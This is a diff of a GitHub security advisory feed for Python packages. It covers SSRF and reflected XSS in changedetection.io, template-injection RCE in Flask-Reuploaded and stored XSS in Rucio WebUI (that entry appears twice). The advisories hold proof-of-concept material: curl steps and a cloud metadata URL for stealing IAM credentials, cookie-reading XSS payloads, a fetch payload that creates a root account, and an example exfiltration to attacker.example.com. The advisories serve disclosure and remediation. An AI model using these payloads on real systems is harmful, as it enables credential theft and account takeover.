@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-02-25T18:18:14.770Z</updated>
+    <updated>2026-02-25T19:20:50.705Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,972 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[changedetection.io] changedetection.io is Vulnerable to SSRF via Watch URLs]]></title>
+        <id>https://github.com/advisories/GHSA-3c45-4pj5-ch7m</id>
+        <link href="https://github.com/advisories/GHSA-3c45-4pj5-ch7m"/>
+        <updated>2026-02-25T19:08:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Changedetection.io is vulnerable to Server-Side Request Forgery (SSRF) because the URL validation function <code>is_safe_valid_url()</code> does not validate the resolved IP address of watch URLs against private, loopback, or link-local address ranges. An authenticated user (or any user when no password is configured, which is the default) can add a watch for internal network URLs such as:</p>
+<ul>
+<li><code>http://169.254.169.254</code></li>
+<li><code>http://10.0.0.1/</code></li>
+<li><code>http://127.0.0.1/</code></li>
+</ul>
+<p>The application fetches these URLs server-side, stores the response content, and makes it viewable through the web UI — enabling full data exfiltration from internal services.</p>
+<p>This is particularly severe because:</p>
+<ul>
+<li>The fetched content is stored and viewable - this is not a blind SSRF</li>
+<li>Watches are fetched periodically - creating a persistent SSRF that continuously accesses internal resources</li>
+<li>By default, no password is set - the web UI is accessible without authentication</li>
+<li>Self-hosted deployments typically run on cloud infrastructure where <code>169.254.169.254</code> returns real IAM credentials</li>
+</ul>
+<hr>
+<h2 id="details">Details</h2>
+<p>The URL validation function <code>is_safe_valid_url()</code> in <code>changedetectionio/validate_url.py</code> (lines 60–122) validates the URL protocol (http/https/ftp) and format using the <code>validators</code> library, but does not perform any DNS resolution or IP address validation:</p>
+<pre><code class="language-python"># changedetectionio/validate_url.py:60-122
+@lru_cache(maxsize=1000)
+def is_safe_valid_url(test_url):
+
+    safe_protocol_regex = '^(http|https|ftp):'
+
+    # Check protocol
+    pattern = re.compile(os.getenv('SAFE_PROTOCOL_REGEX', safe_protocol_regex), re.IGNORECASE)
+    if not pattern.match(test_url.strip()):
+        return False
+
+    # Check URL format
+    if not validators.url(test_url, simple_host=True):
+        return False
+
+    return True  # No IP address validation performed
+</code></pre>
+<p>The HTTP fetcher in <code>changedetectionio/content_fetchers/requests.py</code> (lines 83–89) then makes the request without any additional IP validation:</p>
+<pre><code class="language-python"># changedetectionio/content_fetchers/requests.py:83-89
+r = session.request(method=request_method,
+                    url=url,            # User-provided URL, no IP validation
+                    headers=request_headers,
+                    timeout=timeout,
+                    proxies=proxies,
+                    verify=False)
+</code></pre>
+<p>The response content is stored and made available to the user:</p>
+<pre><code class="language-python"># changedetectionio/content_fetchers/requests.py:140-142
+self.content = r.text     # Text content stored
+self.raw_content = r.content  # Raw bytes stored
+</code></pre>
+<p>This validation gap exists in all entry points that accept watch URLs:</p>
+<ul>
+<li>Web UI: <code>changedetectionio/store/__init__.py:718</code></li>
+<li>REST API: <code>changedetectionio/api/watch.py:163, 428</code></li>
+<li>Import API: <code>changedetectionio/api/import.py:188</code></li>
+</ul>
+<p>All use the same <code>is_safe_valid_url()</code> function, so a single fix addresses all paths.</p>
+<hr>
+<h2 id="poc">PoC</h2>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>A changedetection.io instance (Docker deployment)</li>
+<li>Network access to the instance (default port 5000)</li>
+</ul>
+<h3 id="step-1-deploy-changedetectionio-with-an-internal-service">Step 1: Deploy changedetection.io with an internal service</h3>
+<p>Create <code>internal-service.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps({
+            'Code': 'Success',
+            'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',
+            'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
+            'Token': 'FwoGZXIvYXdzEBYaDExampleSessionToken'
+        }).encode())
+HTTPServer(('0.0.0.0', 80), H).serve_forever()
+</code></pre>
+<p>Create <code>Dockerfile.internal</code>:</p>
+<pre><code>FROM python:3.11-slim
+COPY internal-service.py /server.py
+CMD ["python3", "/server.py"]
+</code></pre>
+<p>Create <code>docker-compose.yml</code>:</p>
+<pre><code class="language-yaml">version: "3.8"
+services:
+  changedetection:
+    image: ghcr.io/dgtlmoon/changedetection.io
+    ports:
+      - "5000:5000"
+    volumes:
+      - ./datastore:/datastore
+
+  internal-service:
+    build:
+      context: .
+      dockerfile: Dockerfile.internal
+</code></pre>
+<p>Start the stack:</p>
+<pre><code class="language-bash">docker compose up -d
+</code></pre>
+<h3 id="step-2-add-a-watch-for-the-internal-service">Step 2: Add a watch for the internal service</h3>
+<p>Open <code>http://localhost:5000/</code> in a browser (no password required by default).</p>
+<p>In the URL field, enter:</p>
+<pre><code>http://internal-service/
+</code></pre>
+<p>Click <strong>Watch</strong> and wait for the first check to complete.</p>
+<h3 id="step-3-view-the-exfiltrated-data">Step 3: View the exfiltrated data</h3>
+<p>Click on the watch entry, then click <strong>Preview</strong>. The page displays the internal service’s response containing the simulated credentials:</p>
+<pre><code class="language-json">{
+  "Code": "Success",
+  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  ...
+}
+</code></pre>
+<img src="https://github.com/user-attachments/assets/115b69fb-ea10-4c47-a38c-409ede0e03cd" alt="Screenshot 2026-02-16 084212" height="780" width="2291">
+
+<h3 id="step-4-verify-via-api-alternative">Step 4: Verify via API (alternative)</h3>
+<pre><code class="language-bash"># Get the API key (visible in Settings page of the unauthenticated web UI)
+API_KEY=$(docker compose exec changedetection cat /datastore/url-watches.json | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['settings']['application']['api_access_token'])")
+
+# Create a watch via API
+WATCH_RESPONSE=$(curl -s -X POST "http://localhost:5000/api/v1/watch" \
+  -H "x-api-key: $API_KEY" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://internal-service/"}')
+
+WATCH_UUID=$(echo "$WATCH_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['uuid'])")
+echo "Watch created: $WATCH_UUID"
+
+# Wait for the first fetch to complete
+echo "Waiting 30s for first fetch..."
+sleep 30
+
+# Retrieve the exfiltrated data via API
+LATEST_TS=$(curl -s "http://localhost:5000/api/v1/watch/$WATCH_UUID/history" \
+  -H "x-api-key: $API_KEY" | \
+  python3 -c "import sys,json; h=json.load(sys.stdin); print(sorted(h.keys())[-1]) if h else print('')")
+
+echo "=== EXFILTRATED DATA ==="
+curl -s "http://localhost:5000/api/v1/watch/$WATCH_UUID/history/$LATEST_TS" \
+  -H "x-api-key: $API_KEY"
+</code></pre>
+<p>Expected output — the internal service’s response containing simulated credentials:</p>
+<pre><code class="language-json">{
+  "Code": "Success",
+  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  ...
+}
+</code></pre>
+<p>In a real cloud deployment, replacing <code>http://internal-service/</code> with:</p>
+<pre><code class="language-bash">http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</code></pre>
+<p>would return real AWS IAM credentials.</p>
+<img src="https://github.com/user-attachments/assets/cb1f5c02-6604-49e6-9e26-13406b190b45" alt="Screenshot 2026-02-16 084407" height="607" width="1140">
+
+<hr>
+<h2 id="impact">Impact</h2>
+<p><strong>Who is impacted:</strong><br>All self-hosted changedetection.io deployments, particularly those running on cloud infrastructure (AWS, GCP, Azure) where the instance metadata service at <code>169.254.169.254</code> is accessible.</p>
+<p><strong>What an attacker can do:</strong></p>
+<ul>
+<li><strong>Steal cloud credentials:</strong> Access the cloud metadata endpoint to obtain IAM credentials, service account tokens, or managed identity tokens</li>
+<li><strong>Scan internal networks:</strong> Discover internal services by adding watches for internal IP ranges and observing responses</li>
+<li><strong>Access internal services:</strong> Read data from internal APIs, databases, and admin interfaces that are not exposed to the internet</li>
+<li><strong>Persistent access:</strong> Watches are fetched periodically on a configurable schedule, providing continuous access to internal resources</li>
+<li><strong>No authentication required by default:</strong> The web UI has no password set by default, allowing any user with network access to exploit this vulnerability</li>
+</ul>
+<hr>
+<h3 id="suggested-remediation">Suggested Remediation</h3>
+<p>Add IP address validation to <code>is_safe_valid_url()</code> in <code>changedetectionio/validate_url.py</code>:</p>
+<pre><code class="language-python">import ipaddress
+import socket
+
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network('127.0.0.0/8'),     # Loopback
+    ipaddress.ip_network('10.0.0.0/8'),      # Private (RFC 1918)
+    ipaddress.ip_network('172.16.0.0/12'),   # Private (RFC 1918)
+    ipaddress.ip_network('192.168.0.0/16'),  # Private (RFC 1918)
+    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / Cloud metadata
+    ipaddress.ip_network('::1/128'),         # IPv6 loopback
+    ipaddress.ip_network('fc00::/7'),        # IPv6 unique local
+    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local
+]
+
+def is_private_ip(hostname):
+    """Check if a hostname resolves to a private/reserved IP address."""
+    try:
+        for info in socket.getaddrinfo(hostname, None):
+            ip = ipaddress.ip_address(info[4][0])
+            for network in BLOCKED_NETWORKS:
+                if ip in network:
+                    return True
+    except socket.gaierror:
+        return True  # Block unresolvable hostnames
+    return False
+</code></pre>
+<p>Then add to <code>is_safe_valid_url()</code> before the final <code>return True</code>:</p>
+<pre><code class="language-python"># Check for private/reserved IP addresses
+parsed = urlparse(test_url)
+if parsed.hostname and is_private_ip(parsed.hostname):
+    logger.warning(f"URL '{test_url}' resolves to a private/reserved IP address")
+    return False
+</code></pre>
+<p>An environment variable (e.g., <code>ALLOW_PRIVATE_IPS=true</code>) could be provided for users who intentionally need to monitor internal services.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-3c45-4pj5-ch7m">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-3c45-4pj5-ch7m</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27696">https://nvd.nist.gov/vuln/detail/CVE-2026-27696</a></li>
+<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/fe7aa38c651d73fe5f41ce09855fa8f97193747b">https://github.com/dgtlmoon/changedetection.io/commit/fe7aa38c651d73fe5f41ce09855fa8f97193747b</a></li>
+<li><a href="https://github.com/advisories/GHSA-3c45-4pj5-ch7m">https://github.com/advisories/GHSA-3c45-4pj5-ch7m</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3c45-4pj5-ch7m</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T19:08:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[changedetection.io] changedetection.io Vulnerable to Reflected XSS in RSS Single Watch Error Response]]></title>
+        <id>https://github.com/advisories/GHSA-mw8m-398g-h89w</id>
+        <link href="https://github.com/advisories/GHSA-mw8m-398g-h89w"/>
+        <updated>2026-02-25T19:07:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Three security vulnerabilities were identified in <a href="http://changedetection.io/">changedetection.io</a> through source code review and live validation against a locally deployed Docker instance. All vulnerabilities were confirmed exploitable on the latest version (0.53.6) it was additionally validated at scale against 500 internet-facing instances discovered via FOFA search engine, producing 5K+ confirmed detections using a custom Nuclei template, demonstrating widespread real-world impact.
+The RSS single-watch endpoint reflects the UUID path parameter directly in the HTTP response body without HTML escaping. Since Flask returns text/html by default for plain string responses, the browser parses and executes injected JavaScript.</p>
+<h3 id="details">Details</h3>
+<p>File: <code>changedetectionio/blueprint/rss/single_watch.py (lines ~45 and ~50)</code></p>
+<p>The UUID parameter from the URL path is interpolated into the response body using an f-string with no escaping:</p>
+<h3 id="line-45">Line ~45</h3>
+<pre><code>watch = datastore.data['watching'].get(uuid)
+if not watch:
+    return f"Watch with UUID {uuid} not found", 404  # ← No escaping, Content-Type: text/html
+</code></pre>
+<h3 id="line-50">Line ~50</h3>
+<pre><code>if len(dates) &lt; 2:
+    return f"Watch {uuid} does not have enough history snapshots...", 400  # ← Same issue
+Flask's default Content-Type for plain string responses is text/html; charset=utf-8, so any HTML/JavaScript in {uuid} is rendered by the browser.
+</code></pre>
+<h2 id="attack-vector">Attack Vector</h2>
+<p>The attack requires a valid RSS access token, which is a 32-character hex string exposed in the HTML  tag on the homepage without authentication:</p>
+
+
+
+<p>Attacker visits the target's homepage if it unauthenticathed and extracts the RSS token from the  tag
+Crafts a malicious URL:</p>
+<ol>
+<li><a href="http://target:5000/rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=EXTRACTED_TOKEN">http://target:5000/rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=EXTRACTED_TOKEN</a></li>
+<li>Sends the link to a victim who has an active session on the <a href="http://changedetection.io/">changedetection.io</a> instance</li>
+<li>When the victim clicks the link, the server responds with:</li>
+<li>Watch with UUID not found</li>
+</ol>
+<p>The browser renders the <img> tag, the onerror fires, and JavaScript executes in the victim's session context</p>
+<h3 id="poc">PoC</h3>
+<p>Request:</p>
+<pre><code>GET /rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=223e7edbbfee2268f5abb5344919054e HTTP/1.1
+Host: [127.0.0.1:5000](http://127.0.0.1:5000/)
+</code></pre>
+<p>Response:</p>
+<pre><code>HTTP/1.1 404 NOT FOUND
+Content-Type: text/html; charset=utf-8
+</code></pre>
+<p>Watch with UUID not found</p>
+<img src="https://github.com/user-attachments/assets/1633b167-e4ec-4705-a110-18fad7826fc9" alt="image" height="1032" width="1918">
+
+<p>The XSS payload is reflected unescaped in an HTML response. The browser executes alert(document.cookie).</p>
+<p>Lots of intances over internet affected to this.
+<img src="https://github.com/user-attachments/assets/f54160d4-abd1-4e8d-b845-f85e53e79325" alt="image" height="721" width="1465"></p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>Session cookie theft via document.cookie exfiltration</li>
+<li>Account takeover if session cookies lack HttpOnly flag</li>
+<li>Phishing via crafted links that appear to originate from a trusted <a href="http://changedetection.io/">changedetection.io</a> instance</li>
+<li>Token is obtainable without authentication from the homepage  tag, lowering the barrier to exploitation</li>
+</ul>
+<p>changedetection.io can work with developer teams to validate and address these issues. Please confirm receipt of this report and inform changedetection.io of the preferred timeline for coordinating the fix.</p>
+<p>Roberto Nunes</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w">https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27645">https://nvd.nist.gov/vuln/detail/CVE-2026-27645</a></li>
+<li><a href="https://github.com/dgtlmoon/changedetection.io/commit/a385c89abf44b52fcfa20c7c6a6dd3047c4c1eb5">https://github.com/dgtlmoon/changedetection.io/commit/a385c89abf44b52fcfa20c7c6a6dd3047c4c1eb5</a></li>
+<li><a href="https://github.com/advisories/GHSA-mw8m-398g-h89w">https://github.com/advisories/GHSA-mw8m-398g-h89w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mw8m-398g-h89w</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-25T19:07:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[flask-reuploaded] Flask-Reuploaded vulnerable to Remote Code Execution via Server-Side Template Injection]]></title>
+        <id>https://github.com/advisories/GHSA-65mp-fq8v-56jr</id>
+        <link href="https://github.com/advisories/GHSA-65mp-fq8v-56jr"/>
+        <updated>2026-02-25T19:06:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A critical path traversal and extension bypass vulnerability in Flask-Reuploaded allows remote attackers to achieve arbitrary file write and remote code execution through Server-Side Template Injection (SSTI).</p>
+<h3 id="patches">Patches</h3>
+<p>Flask-Reuploaded has been patched in version 1.5.0</p>
+<h3 id="workarounds">Workarounds</h3>
+<ol>
+<li><strong>Do not pass user input to the <code>name</code> parameter</strong></li>
+<li>Use auto-generated filenames only</li>
+<li>Implement strict input validation if <code>name</code> must be used</li>
+</ol>
+<pre><code class="language-python">from werkzeug.utils import secure_filename
+import os
+
+# Sanitize user input before passing to save()
+safe_name = secure_filename(request.form.get('custom_name'))
+# Remove path separators
+safe_name = os.path.basename(safe_name)
+# Validate extension matches policy
+if not photos.extension_allowed(photos.get_extension(safe_name)):
+    abort(400)
+    
+filename = photos.save(file, name=safe_name)
+</code></pre>
+<h3 id="resources">Resources</h3>
+<p>The fix is documented in the pull request, see <a href="https://github.com/jugmac00/flask-reuploaded/pull/180">https://github.com/jugmac00/flask-reuploaded/pull/180</a>.</p>
+<p>A proper write-up was created by the reporter of the vulnerability, Jaron Cabral (<a href="https://www.linkedin.com/in/jaron-cabral-751994357/">https://www.linkedin.com/in/jaron-cabral-751994357/</a>), but is not yet available as of time of this publication.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/jugmac00/flask-reuploaded/security/advisories/GHSA-65mp-fq8v-56jr">https://github.com/jugmac00/flask-reuploaded/security/advisories/GHSA-65mp-fq8v-56jr</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27641">https://nvd.nist.gov/vuln/detail/CVE-2026-27641</a></li>
+<li><a href="https://github.com/jugmac00/flask-reuploaded/pull/180">https://github.com/jugmac00/flask-reuploaded/pull/180</a></li>
+<li><a href="https://github.com/jugmac00/flask-reuploaded/commit/d64c6b2f71cb73734fc38baa0e3e156926361288">https://github.com/jugmac00/flask-reuploaded/commit/d64c6b2f71cb73734fc38baa0e3e156926361288</a></li>
+<li><a href="https://github.com/advisories/GHSA-65mp-fq8v-56jr">https://github.com/advisories/GHSA-65mp-fq8v-56jr</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-65mp-fq8v-56jr</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-02-25T19:06:50.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function]]></title>
+        <id>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</id>
+        <link href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q"/>
+        <updated>2026-02-25T18:58:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored Cross-site Scripting (XSS) vulnerability was identified in the Custom Rules function of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>A malicious payload supplied in the <code>comment</code> field is stored by the backend. When the rule is later viewed or approved, the stored script executes in the WebUI origin.</p>
+<p><strong>Create Path</strong>:<br>Monitoring &gt; Subscriptions and Rules &gt; Request New Rule &gt; Options &gt; Add Comment</p>
+<p><strong>Trigger Paths</strong>:  </p>
+<ul>
+<li><strong>User Trigger</strong>: Monitoring &gt; Subscriptions and Rules &gt; Show My Rules &gt; <em>RULE NAME</em><br>(<code>https://localhost:8443/ui/rule?rule_id=&lt;RULE_ID&gt;</code>)</li>
+<li><strong>Admin Trigger</strong>: Data Transfer (R2D2) &gt; Approve Rules &gt; <em>RULE NAME</em></li>
+</ul>
+<p><strong>Create Request</strong></p>
+<pre><code class="language-http">POST /proxy/rules/ HTTP/1.1
+...
+{"dids":[{"scope":"test","name":"dataset1"}],"account":"pentest","ask_approval":true,"activity":"User Subscriptions","rse_expression":"WEB1","copies":1,"grouping":"DATASET","lifetime":15552000,"comment":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;","asynchronous":false,"notify":"N"}
+</code></pre>
+<p><strong>Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 201 CREATED
+...
+["c2d675c1979d4549b26eede3531a7e6a"]
+</code></pre>
+<p><strong>Creating RSE with XSS payload in comment</strong>
+<img src="https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4" alt="Creating RSE with XSS payload in comment" height="667" width="1032"></p>
+<p><strong>Reviewing rule creation requests</strong>
+<img src="https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7" alt="Reviewing rule creation requests" height="625" width="1201"></p>
+<p><strong>XSS Payload triggering on rule review</strong>
+<img src="https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e" alt="XXS Payload triggering on rule review" height="417" width="1197"></p>
+<hr>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.</p>
+<p>The impact is amplified by:</p>
+<ul>
+<li>Session cookies that are accessible to JavaScript (missing HttpOnly flag).</li>
+<li>API tokens exposed to the WebUI via JavaScript variables.</li>
+</ul>
+<p>An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<p>Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.</p>
+<p><strong>XSS Payload to Create Root UserPass</strong></p>
+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<hr>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as <code>.html()</code> should be avoided unless the content is explicitly sanitized. Safer alternatives include <code>.text()</code>, creating text nodes, or using a templating system that enforces automatic escaping.</p>
+<p>Additional defense-in-depth measures include:</p>
+<ul>
+<li>Enforcing a strict Content Security Policy (CSP).</li>
+<li>Setting the HttpOnly flag on session cookies.</li>
+<li>Avoiding exposure of API tokens in JavaScript-accessible variables.</li>
+</ul>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<hr>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q">https://github.com/advisories/GHSA-rwj9-7j48-9f7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:58:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function]]></title>
+        <id>https://github.com/advisories/GHSA-rwj9-7j48-9f7q</id>
+        <link href="https://github.com/advisories/GHSA-rwj9-7j48-9f7q"/>
+        <updated>2026-02-25T18:58:22.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored Cross-site Scripting (XSS) vulnerability was identified in the Custom Rules function of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p>A malicious payload supplied in the <code>comment</code> field is stored by the backend. When the rule is later viewed or approved, the stored script executes in the WebUI origin.</p>
+<p><strong>Create Path</strong>:<br>Monitoring &gt; Subscriptions and Rules &gt; Request New Rule &gt; Options &gt; Add Comment</p>
+<p><strong>Trigger Paths</strong>:  </p>
+<ul>
+<li><strong>User Trigger</strong>: Monitoring &gt; Subscriptions and Rules &gt; Show My Rules &gt; <em>RULE NAME</em><br>(<code>https://localhost:8443/ui/rule?rule_id=&lt;RULE_ID&gt;</code>)</li>
+<li><strong>Admin Trigger</strong>: Data Transfer (R2D2) &gt; Approve Rules &gt; <em>RULE NAME</em></li>
+</ul>
+<p><strong>Create Request</strong></p>
+<pre><code class="language-http">POST /proxy/rules/ HTTP/1.1
+...
+{"dids":[{"scope":"test","name":"dataset1"}],"account":"pentest","ask_approval":true,"activity":"User Subscriptions","rse_expression":"WEB1","copies":1,"grouping":"DATASET","lifetime":15552000,"comment":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;","asynchronous":false,"notify":"N"}
+</code></pre>
+<p><strong>Response</strong></p>
+<pre><code class="language-http">HTTP/1.1 201 CREATED
+...
+["c2d675c1979d4549b26eede3531a7e6a"]
+</code></pre>
+<p><strong>Creating RSE with XSS payload in comment</strong>
+<img src="https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4" alt="Creating RSE with XSS payload in comment" height="667" width="1032"></p>
+<p><strong>Reviewing rule creation requests</strong>
+<img src="https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7" alt="Reviewing rule creation requests" height="625" width="1201"></p>
+<p><strong>XSS Payload triggering on rule review</strong>
+<img src="https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e" alt="XXS Payload triggering on rule review" height="417" width="1197"></p>
+<hr>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.</p>
+<p>The impact is amplified by:</p>
+<ul>
+<li>Session cookies that are accessible to JavaScript (missing HttpOnly flag).</li>
+<li>API tokens exposed to the WebUI via JavaScript variables.</li>
+</ul>
+<p>An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<p>Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.</p>
+<p><strong>XSS Payload to Create Root UserPass</strong></p>
+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<hr>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as <code>.html()</code> should be avoided unless the content is explicitly sanitized. Safer alternatives include <code>.text()</code>, creating text nodes, or using a templating system that enforces automatic escaping.</p>
+<p>Additional defense-in-depth measures include:</p>
+<ul>
+<li>Enforcing a strict Content Security Policy (CSP).</li>
+<li>Setting the HttpOnly flag on session cookies.</li>
+<li>Avoiding exposure of API tokens in JavaScript-accessible variables.</li>
+</ul>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<hr>
+<h3 id="resources">Resources</h3>
+<ul>
